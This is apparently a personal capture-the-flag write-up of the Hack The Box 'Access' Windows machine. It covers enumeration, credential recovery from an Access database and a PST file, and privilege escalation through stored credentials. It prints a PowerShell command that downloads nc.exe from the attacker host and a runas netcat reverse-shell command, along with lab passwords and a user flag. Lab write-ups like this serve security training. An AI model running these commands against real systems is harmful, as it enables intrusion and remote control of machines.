---
date: 2024-10-04
title: Access HTB Write-Up
machine_ip: 10.10.10.98
os: Windows
difficulty: Easy
my_rating: 5
tags:
  - Windows
  - PrivEsc
  - RunAs
  - FTP
  - JohnTheRipper
  - mdb
  - readpst
  - PowerShell
  - whoami
  - cmdkey
  - gobuster
references: "[[📚CTF Box Writeups]]"
---

# Enumeration

- Nmap
```
┌──(root㉿kali)-[~/Downloads]
└─# nmap -A -p- -sVC 10.10.10.98 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-04 14:18 PDT
Nmap scan report for 10.10.10.98
Host is up (0.090s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet  Microsoft Windows XP telnetd (no more connections allowed)
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|7|2008|8.1|Vista (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   85.90 ms 10.10.14.1
2   85.97 ms 10.10.10.98

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 283.28 seconds
```

- Anonymous `FTP` Login appears to be allowed
```
┌──(root㉿kali)-[~/Downloads]
└─# ftp anonymous@10.10.10.98                                                                                                                    
Connected to 10.10.10.98.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
425 Cannot open data connection.
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
```
- We get the `Access Control.zip` file and `backup.mdb`
```
ftp> get "Access Control.zip"
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |*********************************************************************************************************************************************| 10870       34.61 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 45 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
10870 bytes received in 00:00 (34.60 KiB/s)
```

- `gobuster` shows a weird directory but appears to be nothing
```
┌──(root㉿kali)-[~/Downloads]
└─# gobuster dir -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.98
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/\                    (Status: 200) [Size: 391]
/_Face_testing_at_Logan_is_fo%0Dund_lacking%2B (Status: 400) [Size: 324]
Progress: 141708 / 141709 (100.00%)
===============================================================
Finished
===============================================================
                                                                
```


# Foothold
- gain shell via exploit
- The zip file `Access Control.zip` requires a password... let's try to crack that with `JohnTheRipper`... unsuccessful so tried `hashcat` too. No luck.

- The `backup.mdb` file may have the password inside. Lets check
```
┌──(root㉿kali)-[~/Downloads]
└─# mdb-ver backup.mdb

JET4
```
- The output `JET4` indicates that the `.mdb` file is a Microsoft Access 2000-2003 database, which is supported by `mdbtools`
```
┌──(root㉿kali)-[~/Downloads]
└─# mdb-tables -1 backup.mdb                         

acc_antiback
acc_door
acc_firstopen
acc_firstopen_emp
acc_holidays
acc_interlock
acc_levelset
acc_levelset_door_group
acc_linkageio
acc_map
acc_mapdoorpos
acc_morecardempgroup
acc_morecardgroup
acc_timeseg
acc_wiegandfmt
ACGroup
acholiday
ACTimeZones
action_log
AlarmLog
areaadmin
att_attreport
att_waitforprocessdata
attcalclog
attexception
AuditedExc
auth_group_permissions
auth_message
auth_permission
auth_user
auth_user_groups
auth_user_user_permissions
base_additiondata
base_appoption
base_basecode
base_datatranslation
base_operatortemplate
base_personaloption
base_strresource
base_strtranslation
base_systemoption
CHECKEXACT
CHECKINOUT
dbbackuplog
DEPARTMENTS
deptadmin
DeptUsedSchs
devcmds
devcmds_bak
django_content_type
django_session
EmOpLog
empitemdefine
EXCNOTES
FaceTemp
iclock_dstime
iclock_oplog
iclock_testdata
iclock_testdata_admin_area
iclock_testdata_admin_dept
LeaveClass
LeaveClass1
Machines
NUM_RUN
NUM_RUN_DEIL
operatecmds
personnel_area
personnel_cardtype
personnel_empchange
personnel_leavelog
ReportItem
SchClass
SECURITYDETAILS
ServerLog
SHIFT
TBKEY
TBSMSALLOT
TBSMSINFO
TEMPLATE
USER_OF_RUN
USER_SPEDAY
UserACMachines
UserACPrivilege
USERINFO
userinfo_attarea
UsersMachines
UserUpdates
worktable_groupmsg
worktable_instantmsg
worktable_msgtype
worktable_usrmsg
ZKAttendanceMonthStatistics
acc_levelset_emp
acc_morecardset
ACUnlockComb
AttParam
auth_group
AUTHDEVICE
base_option
dbapp_viewmodel
FingerVein
devlog
HOLIDAYS
personnel_issuecard
SystemLog
USER_TEMP_SCH
UserUsedSClasses
acc_monitor_log
OfflinePermitGroups
OfflinePermitUsers
OfflinePermitDoors
LossCard
TmpPermitGroups
TmpPermitUsers
TmpPermitDoors
ParamSet
acc_reader
acc_auxiliary
STD_WiegandFmt
CustomReport
ReportField
BioTemplate
FaceTempEx
FingerVeinEx
TEMPLATEEx
```
- We see a lot of sensitive information in table `USERINFO` including `password` using command: 
```┌──(root㉿kali)-[~/Downloads]
└─# mdb-schema backup.mdb | less
```

```
CREATE TABLE [USERINFO]
 (
        [USERID]                        Long Integer NOT NULL, 
        [Badgenumber]                   Text (50), 
        [SSN]                   Text (20), 
        [Gender]                        Text (8), 
        [TITLE]                 Text (20), 
        [PAGER]                 Text (20), 
        [BIRTHDAY]                      DateTime, 
        [HIREDDAY]                      DateTime, 
        [street]                        Text (80), 
        [CITY]                  Text (50), 
        [STATE]                 Text (50), 
        [ZIP]                   Text (50), 
        [OPHONE]                        Text (20), 
        [FPHONE]                        Text (20), 
        [VERIFICATIONMETHOD]                    Integer, 
        [DEFAULTDEPTID]                 Long Integer, 
        [SECURITYFLAGS]                 Integer, 
        [ATT]                   Integer NOT NULL, 
        [INLATE]                        Integer NOT NULL, 
        [OUTEARLY]                      Integer NOT NULL, 
        [OVERTIME]                      Integer NOT NULL, 
        [SEP]                   Integer NOT NULL, 
        [HOLIDAY]                       Integer NOT NULL, 
        [MINZU]                 Text (8), 
        [PASSWORD]                      Text (20), 
        [LUNCHDURATION]                 Integer NOT NULL, 
        [PHOTO]                 OLE (255), 
        [mverifypass]                   Text (10), 
        [Notes]                 OLE (255), 
        [privilege]                     Long Integer, 
        [InheritDeptSch]                        Integer, 
        [InheritDeptSchClass]                   Integer, 
        [AutoSchPlan]                   Integer, 
        [MinAutoSchInterval]                    Long Integer, 
        [RegisterOT]                    Integer, 
        [InheritDeptRule]                       Integer, 
        [EMPRIVILEGE]                   Integer, 
        [CardNo]                        Text (20), 
        [change_operator]                       Text (50), 
        [change_time]                   DateTime, 
        [create_operator]                       Text (50), 
        [create_time]                   DateTime, 
        [delete_operator]                       Text (50), 
        [delete_time]                   DateTime, 
        [status]                        Long Integer, 
        [lastname]                      Text (50), 
        [AccGroup]                      Long Integer, 
        [TimeZones]                     Text (50), 
        [identitycard]                  Text (50), 
        [UTime]                 DateTime, 
        [Education]                     Text (50), 
        [OffDuty]                       Long Integer, 
        [DelTag]                        Long Integer, 
        [morecard_group_id]                     Long Integer, 
        [set_valid_time]                        Boolean NOT NULL, 
        [acc_startdate]                 DateTime, 
        [acc_enddate]                   DateTime, 
        [birthplace]                    Text (50), 
        [Political]                     Text (50), 
        [contry]                        Text (50), 
        [hiretype]                      Long Integer, 
        [email]                 Text (50), 
        [firedate]                      DateTime, 
        [isatt]                 Boolean NOT NULL, 
        [homeaddress]                   Text (50), 
        [emptype]                       Long Integer, 
        [bankcode1]                     Text (50), 
        [bankcode2]                     Text (50), 
        [isblacklist]                   Long Integer, 
        [Iuser1]                        Long Integer, 
        [Iuser2]                        Long Integer, 
        [Iuser3]                        Long Integer, 
        [Iuser4]                        Long Integer, 
        [Iuser5]                        Long Integer, 
        [Cuser1]                        Text (50), 
        [Cuser2]                        Text (50), 
        [Cuser3]                        Text (50), 
        [Cuser4]                        Text (50), 
        [Cuser5]                        Text (50), 
        [Duser1]                        DateTime, 
        [Duser2]                        DateTime, 
        [Duser3]                        DateTime, 
        [Duser4]                        DateTime, 
        [Duser5]                        DateTime, 
        [reserve]                       Long Integer, 
        [name]                  Text (50), 
        [OfflineBeginDate]                      DateTime, 
        [OfflineEndDate]                        DateTime, 
        [carNo]                 Text (50), 
        [carType]                       Text (50), 
        [carBrand]                      Text (50), 
        [carColor]                      Text (50)
```

- Converting the table to a csv
```
┌──(root㉿kali)-[~/Downloads]
└─# mdb-export backup.mdb USERINFO > Users.csv
```
- Viewing it in LibreOffice Calc, we find some passwords to try:
	- 20481
	- 10101
	- 0
	- 666666
	- 123321
- No luck, no worries. We also found another table we can check `auth_user`
```
CREATE TABLE [auth_user]
 (
        [id]                    Long Integer, 
        [username]                      Text (50), 
        [password]                      Text (50), 
        [Status]                        Long Integer, 
        [last_login]                    DateTime, 
        [RoleID]                        Long Integer, 
        [Remark]                        Memo/Hyperlink (255)
);
```

```
┌──(root㉿kali)-[~/Downloads]
└─# mdb-export backup.mdb auth_user > auth_users.csv 
```
- This looks much more promising
![[Pasted image 20241004160128.png]]
- Lets try the creds `engineer:access4u@security`
- It worked! The zip file extracted and we got the `Access Control.pst` file
	- Using `readpst` we can make the outlook message a readible format
```
┌──(root㉿kali)-[~/Downloads]
└─# readpst Access\ Control.pst
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
                                                           
```
- Success... reading the `pst` file we can see the password for the `security` account has been changed to `4Cc3ssC0ntr0ller` 
- Trying the creds `security:4Cc3ssC0ntr0ller` on the open telnet port, we have success and gain a shell!
```
┌──(root㉿kali)-[~/Downloads]
└─# telnet 10.10.10.98 
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami 
access\security
```

# PrivEsc
- escalate from user to root
- Checking the stored credentials on the security account, we find
```
C:\Users\security>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Users\security>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

- We can use `RunAs` to escalate to the stored creds of the `Administrator` account
- First, lets test the functionality to see if this will work with a `whoami` command passed with the stored creds
```
C:\Users\security>runas /env /noprofile /savecred /user:ACCESS\Administrator "cmd.exe /c whoami > whoami.txt"

C:\Users\security>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\security

10/05/2024  12:17 AM    <DIR>          .
10/05/2024  12:17 AM    <DIR>          ..
08/24/2018  08:37 PM    <DIR>          .yawcam
08/21/2018  11:35 PM    <DIR>          Contacts
08/28/2018  07:51 AM    <DIR>          Desktop
08/21/2018  11:35 PM    <DIR>          Documents
08/21/2018  11:35 PM    <DIR>          Downloads
08/21/2018  11:35 PM    <DIR>          Favorites
08/21/2018  11:35 PM    <DIR>          Links
08/21/2018  11:35 PM    <DIR>          Music
08/21/2018  11:35 PM    <DIR>          Pictures
08/21/2018  11:35 PM    <DIR>          Saved Games
08/21/2018  11:35 PM    <DIR>          Searches
08/24/2018  08:39 PM    <DIR>          Videos
10/05/2024  12:17 AM                22 whoami.txt
               1 File(s)             22 bytes
              14 Dir(s)   3,347,431,424 bytes free

C:\Users\security>type whoami.txt
access\administrator
```

- Success, lets now move on to getting a revshell with `nc`
- First, we need to put `nc` onto the RHOST, we start a python server to transfer
```
┌──(root㉿kali)-[~/Downloads]
└─# python3 -m http.server      
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.98 - - [04/Oct/2024 16:28:24] "GET /nc.exe HTTP/1.1" 200 -
```

- And use powershell on the RHOST to download the file from the LHOST
```
C:\temp>powershell "IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.6:8000/nc.exe', 'C:\temp\nc.exe')" -bypass executionpolicy

dir
Invoke-Expression : Cannot bind argument to parameter 'Command' because it is null.
At line:1 char:4
+ IEX <<<< (New-Object Net.WebClient).downloadFile('http://10.10.14.6:8000/nc.exe', 'C:\temp\nc.exe') -bypass executionpolicy
    + CategoryInfo          : InvalidData: (:) [Invoke-Expression], ParameterBindingValidationException
    + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.InvokeExpressionCommand
 

C:\temp>C:\temp> Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\temp

10/05/2024  12:27 AM    <DIR>          .
10/05/2024  12:27 AM    <DIR>          ..
08/21/2018  11:25 PM    <DIR>          logs
10/05/2024  12:28 AM            59,392 nc.exe
08/21/2018  11:25 PM    <DIR>          scripts
08/21/2018  11:25 PM    <DIR>          sqlsource
               1 File(s)         59,392 bytes
               5 Dir(s)   3,347,288,064 bytes free
```

- Now, we can start our listener and escalate using `RunAs` and `nc`
```
┌──(root㉿kali)-[~/Downloads]
└─# nc -lnvp 443                    
listening on [any] 443 ...
```

- Escalate using `RunAs` and `nc`
```
runas /env /noprofile /savecred /user:ACCESS\Administrator "c:\temp\nc.exe 10.10.14.6 443 -e cmd.exe"
```

- BOOM! We escalated and are now Administrator
```
┌──(root㉿kali)-[~/Downloads]
└─# nc -lnvp 443                    
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.98] 49158
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\temp>whoami
whoami
access\administrator
```

- User flag - security
```
C:\Users\security\Desktop>type user.txt
3fcf2ab8a0d0d52847c28b517bc178a0
```

- Root flag
```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
```